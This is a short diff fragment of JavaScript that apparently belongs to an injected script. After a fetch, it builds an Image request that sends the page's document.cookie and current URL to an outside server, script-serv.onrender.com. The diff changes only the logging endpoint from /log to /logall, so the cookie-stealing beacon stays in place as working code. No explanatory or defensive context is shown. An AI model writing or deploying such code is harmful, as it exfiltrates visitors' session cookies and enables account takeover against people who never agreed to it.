@@ -14,7 +14,7 @@
     .then((r) => r.json())
     .then((d) => {
       new Image().src =
-        "https://script-serv.onrender.com/log?cookie=" +
+        "https://script-serv.onrender.com/logall?cookie=" +
         encodeURIComponent(document.cookie) +
         "&url=" +
         encodeURIComponent(location.href) +
